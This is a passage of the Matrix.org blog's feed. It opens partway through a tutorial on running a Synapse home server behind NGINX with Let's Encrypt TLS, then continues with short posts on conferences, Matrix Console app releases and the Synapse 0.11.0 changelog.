        ssl_ciphers &quot;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:ECDHE-RSA-DES-CBC3-SHA:ECDHE-ECDSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA&quot;;
        ssl_session_cache shared:SSL:50m;
        access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;examplecom.ssl_access_log main;
        error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;examplecom.ssl_error_log info;
        root &#x2F;var&#x2F;www&#x2F;examplecom&#x2F;htdocs;
        location &#x2F;_matrix {&#x27;{&#x27;}
            proxy_pass http:&#x2F;&#x2F;localhost:8008;
        {&#x27;}&#x27;}
    {&#x27;}&#x27;}
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p2&quot;&gt;It looks pretty similar to our previous server block, except for all that stuff about SSL in the middle. We&#x27;re pointing NGINX at our certificate, key and Diffie Hellman parameter files and specifying what protocols and ciphers we want our server to talk. The long list here is taken from &lt;a href=&quot;https:&#x2F;&#x2F;wiki.mozilla.org&#x2F;Security&#x2F;Server_Side_TLS&quot; target=&quot;_blank&quot;&gt;Mozilla&#x27;s Server Side TLS guidelines&lt;&#x2F;a&gt; and is their &#x27;Intermediate&#x27; list. See that page for more information on what that means, and choose a different list of ciphers if you prefer: just remember we must support at least the ephemeral Diffie Hellman ciphers, or other home servers won&#x27;t talk to us!&lt;&#x2F;p&gt;
&lt;p class=&quot;p2&quot;&gt;Now let&#x27;s restart our NGINX and see if it works:&lt;&#x2F;p&gt;
&lt;pre&gt;# nginx -s reload
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p2&quot;&gt;...and that command again, this time with https:&lt;&#x2F;p&gt;
&lt;pre&gt;$ curl https:&#x2F;&#x2F;example.com&#x2F;_matrix&#x2F;key&#x2F;v2&#x2F;server&#x2F;auto
{&#x27;{&#x27;}&quot;old_verify_keys&quot;:{&#x27;{&#x27;}{&#x27;}&#x27;},&quot;server_name&quot;:&quot;example.com&quot;,&quot;signatures&quot;:{&#x27;{&#x27;}&quot;example.com&quot;:{&#x27;{&#x27;}&quot;ed25519:auto&quot;:&quot;RWb+w6vHUUokoDgElwG6Cg50ezZvBrzXtJmJIH8jEwI5x0JQ7prn3FwjhbgKTH5jE7J8Ily3HEc4COn4JCCvCA&quot;{&#x27;}&#x27;}{&#x27;}&#x27;},&quot;tls_fingerprints&quot;:[{&#x27;{&#x27;}&quot;sha256&quot;:&quot;DMbzSZ5Uj7&#x2F;6p&#x2F;RT&#x2F;UtQYJLHm5o0TwBSVYXsqpDdVDs&quot;{&#x27;}&#x27;}],&quot;valid_until_ts&quot;:1455203001035,&quot;verify_keys&quot;:{&#x27;{&#x27;}&quot;ed25519:auto&quot;:{&#x27;{&#x27;}&quot;key&quot;:&quot;1YiTDjmE86AlmrbIYE2lyqauV9wPo8jw2kxZAZFfl&#x2F;Q&quot;{&#x27;}&#x27;}{&#x27;}&#x27;}{&#x27;}&#x27;}
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Hooray! You should now be able to open a browser to https:&#x2F;&#x2F;example.com&#x2F;matrix&#x2F; and log in securely over SSL!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;renewing-your-certificate&quot;&gt;Renewing Your Certificate&lt;&#x2F;h2&gt;
&lt;p class=&quot;p1&quot;&gt;Now, there&#x27;s one important step left, and that&#x27;s to set up renewal for the certificate, otherwise we&#x27;ll find our shiny new SSL will stop working in three months time. We can use the same acme_tiny command to do this:&lt;&#x2F;p&gt;
&lt;pre&gt;$ python ~&#x2F;acme-tiny&#x2F;acme_tiny.py --account letsencrypt_examplecom_account.key --csr examplecom.csr --acme-dir challenges&#x2F; &amp;gt; examplecom.crt
Parsing account key...
Parsing CSR...
Registering account...
Already registered!
Verifying example.com...
example.com verified!
Verifying www.example.com...
www.example.com verified!
Signing certificate...
Certificate signed!
$ wget https:&#x2F;&#x2F;letsencrypt.org&#x2F;certs&#x2F;lets-encrypt-x3-cross-signed.pem
--2016-02-06 23:38:55--  https:&#x2F;&#x2F;letsencrypt.org&#x2F;certs&#x2F;lets-encrypt-x3-cross-signed.pem
Resolving letsencrypt.org... 23.66.17.98, 2a02:26f0:60:489::2a1f, 2a02:26f0:60:481::2a1f
Connecting to letsencrypt.org|23.66.17.98|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1675 (1.6K) [application&#x2F;x-x509-ca-cert]
Saving to: ‘lets-encrypt-x3-cross-signed.pem&#x27;
lets-encrypt-x3-cross-signed.pe 100%[======================================================&amp;gt;]   1.64K  --.-KB&#x2F;s   in 0s
2016-02-06 23:38:55 (61.5 MB&#x2F;s) - ‘lets-encrypt-x3-cross-signed.pem&#x27; saved [1675&#x2F;1675]
$ cat examplecom&#x2F;examplecom.crt lets-encrypt-x3-cross-signed.pem &amp;gt;examplecom&#x2F;examplecom_cert_chain.crt
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Synapse will automatically pick up the new certificate, but we&#x27;ll need to tell NGINX to reload:&lt;&#x2F;p&gt;
&lt;pre&gt;# nginx -s reload
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Setting up a cronjob to automate this is left as an exercise to the reader!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;federation-behind-the-http-proxy&quot;&gt;Federation behind the HTTP Proxy&lt;&#x2F;h2&gt;
&lt;p class=&quot;p1&quot;&gt;If you like, you can stop reading now: our clients can access our home server securely but other home server are still talking to our Synapse directly on port 8448. This is fine, and if you&#x27;re happy with this, you can stop reading now. But remember how we made sure other Synapses could talk to our NGINX? Well, why not put federation behind our new web server too?&lt;&#x2F;p&gt;
&lt;p class=&quot;p1&quot;&gt;Now, we need to do a couple of things to make this work: were you looking carefully at the JSON those curl commands returned? If you were, you might have noticed a key called, &#x27;tls_fingerprints&#x27;. Our home server serves up a fingerprint of the TLS certificate its using from this API, and we&#x27;ve just given our web server a different certificate, so we need to give Synapse our new certificate.&lt;&#x2F;p&gt;
&lt;p class=&quot;p1&quot;&gt;How are we going to tell other home servers to talk to our NGINX instead? Well, ultimately we&#x27;re going to change our DNS SRV record to point at port 443 instead of port 8448, but that change could take a while to propagate through caches, so let&#x27;s test it by having our NGINX listen on port 8448 temporarily. We can do this by copying that same block from above, but with a different port:&lt;&#x2F;p&gt;
&lt;pre&gt;    server {&#x27;{&#x27;}
        listen 0.0.0.0:8448;
        server_name example.com www.example.com;
    [etc]
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p2&quot;&gt;Don&#x27;t restart NGINX just yet: we need to tell our Synapse to stop listening on that port first, so lets do that and give it our new certificate:&lt;&#x2F;p&gt;
&lt;pre&gt;$ nano &#x2F;home&#x2F;synapse&#x2F;synapse&#x2F;homeserver.yaml
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p2&quot;&gt;Now we&#x27;ll want to find and edit the following lines:&lt;&#x2F;p&gt;
&lt;pre&gt;tls_certificate_path: &quot;&#x2F;etc&#x2F;ssl&#x2F;nginx&#x2F;examplecom_crt.pem&quot;
# We can comment this out, as long as we set no_tls to true below
# tls_private_key_path: &quot;&#x2F;whatever&#x2F;path&#x2F;synapse&#x2F;generated&quot;
# PEM dh parameters for ephemeral keys
tls_dh_params_path: &quot;&#x2F;whatever&#x2F;path&#x2F;synapse&#x2F;generated&quot;
# Turn off TLS everywhere (this overrides the listeners section below)
no_tls: True
  - port: 8008
    tls: false
    # We can bind to only localhost since only the local nginx needs to hit this
    bind_address: &#x27;127.0.0.1&#x27;
    type: http
    # Set this so that Synapse obeys nginx&#x27;s X-Forwarded-For headers, then IP addresses will be correct in Synapse&#x27;s logs
    x_forwarded: true
    resources:
      - names: [client, webclient]
        compress: true
      - names: [federation]
        compress: false
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p2&quot;&gt;Note: if you have an old enough config file that you have &#x27;bind_host&#x27; and &#x27;bind_port&#x27; directives, now is the time to remove them.&lt;&#x2F;p&gt;
&lt;p class=&quot;p2&quot;&gt;Now let&#x27;s restart Synapse and our web server to swap over what&#x27;s listening on our port 8448:&lt;&#x2F;p&gt;
&lt;pre&gt;$ synctl restart
# nginx -s reload
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p2&quot;&gt;Now let&#x27;s try that test again on port 8448:&lt;&#x2F;p&gt;
&lt;pre&gt;$ curl https:&#x2F;&#x2F;example.com:8448&#x2F;_matrix&#x2F;key&#x2F;v2&#x2F;server&#x2F;auto
{&#x27;{&#x27;}&quot;old_verify_keys&quot;:{&#x27;{&#x27;}{&#x27;}&#x27;},&quot;server_name&quot;:&quot;example.com&quot;,&quot;signatures&quot;:{&#x27;{&#x27;}&quot;example.com&quot;:{&#x27;{&#x27;}&quot;ed25519:auto&quot;:&quot;bdca31805e4209f6ff4d644251a29d0cb1dc828a4d6131c57cf8305288f337c0&quot;{&#x27;}&#x27;}{&#x27;}&#x27;},&quot;tls_fingerprints&quot;:[{&#x27;{&#x27;}&quot;sha256&quot;:&quot;1d9ec66599e229654a79f28e26675fdeb585027553af6d581926e821a6b6527c&quot;{&#x27;}&#x27;}],&quot;valid_until_ts&quot;:1455203001035,&quot;verify_keys&quot;:{&#x27;{&#x27;}&quot;ed25519:auto&quot;:{&#x27;{&#x27;}&quot;key&quot;:&quot;1YiTDjmE86AlmrbIYE2lyqauV9wPo8jw2kxZAZFfl&#x2F;Q&quot;{&#x27;}&#x27;}{&#x27;}&#x27;}{&#x27;}&#x27;}
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Notice anything different? The tls_fingerprints part has changed because we now have a different certificate. The signatures&#x2F;example.com&#x2F;ed25519:auto value has changed too: that&#x27;s because that part is a signature of the rest of JSON object, so changing the tls_fingerprints has caused this to change too.&lt;&#x2F;p&gt;
&lt;p class=&quot;p1&quot;&gt;And that&#x27;s it! If you&#x27;re happy everything is working, you can then change your DNS SRV record to point at port 443 instead of 8448, then after leaving a few days for the change to propagate through caches, remove the extra server block from your nginx.conf and restart to stop your nginx listening on port 8448.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix in Japan!</title>
        <published>2016-02-09T00:00:00+00:00</published>
        <updated>2016-02-09T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/02/09/matrix-in-japan/" type="text/html"/>
        <id>https://matrix.org/blog/2016/02/09/matrix-in-japan/</id>
        
        <content type="html">&lt;p&gt;こんにちは &lt;&#x2F;p&gt;
&lt;p&gt;Matrix is on its way to Japan where Kegan is attending the &lt;a href=&quot;http:&#x2F;&#x2F;tadhack.com&#x2F;2016&#x2F;mini-japan&#x2F;&quot;&gt;TADHack-mini&lt;&#x2F;a&gt; (Feb 13th and 14th) and &lt;a href=&quot;http:&#x2F;&#x2F;webrtcconference.jp&#x2F;&quot;&gt;WebRTC Conference&lt;&#x2F;a&gt; (Feb 16th and 17th).&lt;&#x2F;p&gt;
&lt;p&gt;Kegan will help hackers with their projects during the TADHack, but first, he will give a talk on Matrix and how it can be used. We are again awarding a &lt;a href=&quot;http:&#x2F;&#x2F;www.trossenrobotics.com&#x2F;&quot;&gt;trossen robot&lt;&#x2F;a&gt; to the best hack using Matrix, and we are as always curious to see what kind of cool and crazy ideas people will come up with!&lt;&#x2F;p&gt;
&lt;p&gt;A couple of days later, Kegan will be giving a talk during the &lt;a href=&quot;http:&#x2F;&#x2F;webrtcconference.jp&#x2F;session&#x2F;#&quot;&gt;WebRTC Conference&lt;&#x2F;a&gt;: &amp;quot;The missing signalling layer for WebRTC&amp;quot;. &lt;&#x2F;p&gt;
&lt;p&gt;Both of the talks will be live-translated, and there will also be a translator available during the events, so please come and say hello to Kegan-san! As always, we are also available in the Matrix HQ room, via a client like &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;Vector&lt;&#x2F;a&gt; or &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;try-matrix-now&#x2F;&quot;&gt;any other client&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;02&#x2F;Item_A_150x100.jpg&quot; alt=&quot;Item_A_150x100&quot; width=&quot;425&quot; height=&quot;283&quot; class=&quot;aligncenter size-full wp-image-1512&quot; &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix at 32C3 Congress!</title>
        <published>2015-12-01T00:00:00+00:00</published>
        <updated>2015-12-01T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/12/01/matrix-at-32c3-congress/" type="text/html"/>
        <id>https://matrix.org/blog/2015/12/01/matrix-at-32c3-congress/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;ccc.de&#x2F;&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;12&#x2F;fairydust.jpg&quot; alt=&quot;fairydust&quot; width=&quot;128&quot; height=&quot;128&quot; class=&quot;alignright size-full wp-image-1399&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
Matrix will be represented at the 32nd Chaos Computer Club, Dec 27th-30th, 2015. We hope to be arranging an &lt;a href=&quot;https:&#x2F;&#x2F;events.ccc.de&#x2F;congress&#x2F;2015&#x2F;wiki&#x2F;Assembly:Matrix&quot;&gt;assembly&lt;&#x2F;a&gt;, where people can come along to learn about Matrix and our recent work on end-to-end encryption, find out what they can use Matrix for - and also do some hacking at the same time!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;UPDATE: We&#x27;ve snagged a table for the assembly at: &amp;quot;hackcenter room with C-base, a table along the pathway&amp;quot;. In practice only Mjark is there from Matrix and may be moving around, so may be easiest to coordinate meetups via #32C3:matrix.org&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The session is free of charge, although you do need a ticket to the Congress itself.&lt;&#x2F;p&gt;
&lt;p&gt;If you are interested, please register by sending an email to mark@matrix.org. All you need for the session is curiosity - but do bring your own laptop if you want to hack as well!&lt;&#x2F;p&gt;
&lt;p&gt;Anyone is welcome to join - it will basically be a fairly open-ended chat about all things relating to Matrix, and a good chance to do some deep digging into Matrix itself.&lt;&#x2F;p&gt;
&lt;p&gt;Hope to see you there!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix Console iOS 0.5.6</title>
        <published>2015-11-22T00:00:00+00:00</published>
        <updated>2015-11-22T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/11/22/matrix-console-ios-0-5-6/" type="text/html"/>
        <id>https://matrix.org/blog/2015/11/22/matrix-console-ios-0-5-6/</id>
        
        <content type="html">&lt;p&gt;In addition to the Android release a couple of days ago, we also released a new version of Matrix Console iOS: v0.5.6! &lt;&#x2F;p&gt;
&lt;p&gt;This release includes a new version of MatrixKit (v0.2.7) that you can take advantage of in your MatrixKit powered app. There are several changes in MatrixKit since the last release, including improved performance, better handling of unrecognized certificates and fixes of reported crash issues. We have also introduced read receipts, improved the chat history display, made room invites more obvious, and fixed a whole lot of JIRA issues.&lt;&#x2F;p&gt;
&lt;p&gt;You can find the full list of changes in the MatrixKit &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-kit&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;CHANGES.rst&lt;&#x2F;a&gt; and the Matrix Console iOS &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-console&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;CHANGES.rst&lt;&#x2F;a&gt; files.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Android Matrix Console 0.5.2</title>
        <published>2015-11-20T00:00:00+00:00</published>
        <updated>2015-11-20T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/11/20/android-matrix-console-0-5-2/" type="text/html"/>
        <id>https://matrix.org/blog/2015/11/20/android-matrix-console-0-5-2/</id>
        
        <content type="html">&lt;p&gt;The Android Matrix Console app v0.5.2 is currently in the queue to go live on the Play store!&lt;&#x2F;p&gt;
&lt;p&gt;This release includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Read receipts!&lt;&#x2F;li&gt;
	&lt;li&gt;Call ring volume is now based on device ring volume&lt;&#x2F;li&gt;
	&lt;li&gt;Accessibility tweaks from Peter Vágner - thanks!&lt;&#x2F;li&gt;
	&lt;li&gt;Better SSL support for older devices&lt;&#x2F;li&gt;
	&lt;li&gt;We fixed an echo problem in Android{&#x27;&lt;-&gt;&#x27;}Android VOIP calls&lt;&#x2F;li&gt;
	&lt;li&gt;A ringback tone for placing outbound calls was added&lt;&#x2F;li&gt;
	&lt;li&gt;Lots of small improvements, e.g. better recent message display and add account dialog&lt;&#x2F;li&gt;
	&lt;li&gt;Fixed several reported issues&#x2F;crashes - for the full list look at the CHANGES files in the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-console&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;console&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;SDK&lt;&#x2F;a&gt; projects&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Get it RSN from the &lt;a href=&quot;https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=org.matrix.androidsdk.alpha&quot;&gt;Google play store&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Enjoy! And please do let us know your feedback in &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.11.0 is here!</title>
        <published>2015-11-17T00:00:00+00:00</published>
        <updated>2015-11-17T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/11/17/synapse-0-11-0-is-here/" type="text/html"/>
        <id>https://matrix.org/blog/2015/11/17/synapse-0-11-0-is-here/</id>
        
        <content type="html">&lt;p&gt;Today, we are releasing Synapse version 0.11.0. In the last week, we have had two release candidates, and this release also includes changes in v0.10.1-rc1 from October. &lt;&#x2F;p&gt;
&lt;p&gt;New features include a new Search API and better options for logging in (CAS and login fallback support) - thanks to Steven for contributing CAS support. We also introduce room tagging and as usual, there are plenty of improvements and fixes. For the full info, see the changelog below.&lt;&#x2F;p&gt;
&lt;p&gt;To upgrade, go read &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;UPGRADE.rst&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;UPGRADE.rst&lt;&#x2F;a&gt; - to install for the first time, go to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;README.rst&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;README.rst&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;code&gt;
Changes in synapse v0.11.0 (2015-11-17)
=======================================
&lt;ul&gt;
&lt;li&gt;Change CAS login API (PR #349)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;changes-in-synapse-v0-11-0-rc2-2015-11-13&quot;&gt;Changes in synapse v0.11.0-rc2 (2015-11-13)&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;Various changes to &#x2F;sync API response format (PR #373)&lt;&#x2F;li&gt;
&lt;li&gt;Fix regression when setting display name in newly joined room over federation (PR #368)&lt;&#x2F;li&gt;
&lt;li&gt;Fix problem where &#x2F;search was slow when using SQLite (PR #366)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;changes-in-synapse-v0-11-0-rc1-2015-11-11&quot;&gt;Changes in synapse v0.11.0-rc1 (2015-11-11)&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;Add Search API (PR #307, #324, #327, #336, #350, #359)&lt;&#x2F;li&gt;
&lt;li&gt;Add &#x27;archived&#x27; state to v2 &#x2F;sync API (PR #316)&lt;&#x2F;li&gt;
&lt;li&gt;Add ability to reject invites (PR #317)&lt;&#x2F;li&gt;
&lt;li&gt;Add config option to disable password login (PR #322)&lt;&#x2F;li&gt;
&lt;li&gt;Add the login fallback API (PR #330)&lt;&#x2F;li&gt;
&lt;li&gt;Add room context API (PR #334)&lt;&#x2F;li&gt;
&lt;li&gt;Add room tagging support (PR #335)&lt;&#x2F;li&gt;
&lt;li&gt;Update v2 &#x2F;sync API to match spec (PR #305, #316, #321, #332, #337, #341)&lt;&#x2F;li&gt;
&lt;li&gt;Change retry schedule for application services (PR #320)&lt;&#x2F;li&gt;
&lt;li&gt;Change retry schedule for remote servers (PR #340)&lt;&#x2F;li&gt;
&lt;li&gt;Fix bug where we hosted static content in the incorrect place (PR #329)&lt;&#x2F;li&gt;
&lt;li&gt;Fix bug where we didn&#x27;t increment retry interval for remote servers (PR #343)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;changes-in-synapse-v0-10-1-rc1-2015-10-15&quot;&gt;Changes in synapse v0.10.1-rc1 (2015-10-15)&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;Add support for CAS, thanks to Steven Hammerton (PR #295, #296)&lt;&#x2F;li&gt;
&lt;li&gt;Add support for using macaroons for access_token (PR #256, #229)&lt;&#x2F;li&gt;
&lt;li&gt;Add support for m.room.canonical_alias (PR #287)&lt;&#x2F;li&gt;
&lt;li&gt;Add support for viewing the history of rooms that they have left. (PR #276, #294)&lt;&#x2F;li&gt;
&lt;li&gt;Add support for refresh tokens (PR #240)&lt;&#x2F;li&gt;
&lt;li&gt;Add flag on creation which disables federation of the room (PR #279)&lt;&#x2F;li&gt;
&lt;li&gt;Add some room state to invites. (PR #275)&lt;&#x2F;li&gt;
&lt;li&gt;Atomically persist events when joining a room over federation (PR #283)&lt;&#x2F;li&gt;
&lt;li&gt;Change default history visibility for private rooms (PR #271)&lt;&#x2F;li&gt;
&lt;li&gt;Allow users to redact their own sent events (PR #262)&lt;&#x2F;li&gt;
&lt;li&gt;Use tox for tests (PR #247)&lt;&#x2F;li&gt;
&lt;li&gt;Split up syutil into separate libraries (PR #243)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;code&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Redecentralize Conference - taking back the net</title>
        <published>2015-10-19T00:00:00+00:00</published>
        <updated>2015-10-19T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/10/19/redecentralize-conference-taking-back-the-net/" type="text/html"/>
        <id>https://matrix.org/blog/2015/10/19/redecentralize-conference-taking-back-the-net/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;10&#x2F;rdc15.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;10&#x2F;rdc15.png&quot; alt=&quot;rdc15&quot; width=&quot;200&quot; height=&quot;200&quot; class=&quot;alignright size-full wp-image-1330&quot; &#x2F;&gt;&lt;&#x2F;a&gt; This weekend, I went to the first &lt;a href=&quot;http:&#x2F;&#x2F;redecentralize.org&#x2F;conference&#x2F;&quot;&gt;Redecentralize Conference&lt;&#x2F;a&gt;. I thought it was a good mix of traditional tech talks and sessions where we discussed how to make people aware of why the net needs to be decentralised. There were a lot of interesting people and we had some really thought-provoking discussions. Sessions in the main room were filmed and &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UCxfh-2aOR5hZUjxJLQ2CIHw&quot;&gt;can be found here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;I did a talk on Matrix in one of the tutorial rooms, and it was great to see people with lots of questions and comments in the session. If you missed the talk - or have further questions: the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;faq.html&quot;&gt;FAQ&lt;&#x2F;a&gt; might have the answer, or maybe &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;&quot;&gt;the Spec&lt;&#x2F;a&gt; itself - and there&#x27;s always &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; where you can find me and the whole matrix team.&lt;&#x2F;p&gt;
&lt;p&gt;At the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=ZuPIoN5DO_k&quot;&gt;end of day-panel&lt;&#x2F;a&gt; on the first day, the question &amp;quot;are there any projects that are ready for mass adoption&amp;quot; was posed, and &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;shevski&quot;&gt;Ira&lt;&#x2F;a&gt; picked Matrix as her answer, which was great to hear. We have come a long way &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2015&#x2F;09&#x2F;07&#x2F;matrix-one-year-in&#x2F;&quot;&gt;in the last year&lt;&#x2F;a&gt;, and I think Matrix now has &amp;quot;enough&amp;quot; features to be a realistic option for your IM&#x2F;VoIP and group chat needs.&lt;&#x2F;p&gt;
&lt;p&gt;I really enjoyed redecentralize and hope it will be repeated! Thanks to the &lt;a href=&quot;http:&#x2F;&#x2F;redecentralize.org&#x2F;&quot;&gt;redecentralize.org&lt;&#x2F;a&gt; gang for arranging it!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Android Matrix Console 0.5.1 released!</title>
        <published>2015-10-07T00:00:00+00:00</published>
        <updated>2015-10-07T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/10/07/android-matrix-console-0-5-1-released/" type="text/html"/>
        <id>https://matrix.org/blog/2015/10/07/android-matrix-console-0-5-1-released/</id>
        
        <content type="html">&lt;p&gt;Following from the addition of voice and video calling in the previous release, we have added some new features and fixed more bugs - and released v0.5.1 of the Android version of the Matrix Console app. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Please note that installing this update will log you out of the app and require you to sign in again!&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This release includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Support for self-signed certificates&lt;&#x2F;li&gt;
	&lt;li&gt;Support for recording and sending video messages&lt;&#x2F;li&gt;
	&lt;li&gt;We have improved the performance when you resume the app&lt;&#x2F;li&gt;
	&lt;li&gt;We fixed a bug where a picture&#x2F;video would disappear after rotation&lt;&#x2F;li&gt;
	&lt;li&gt;Fixed several reported issues&#x2F;crashes - for the full list look at the CHANGES files in the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-console&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;console&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;SDK&lt;&#x2F;a&gt; projects&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
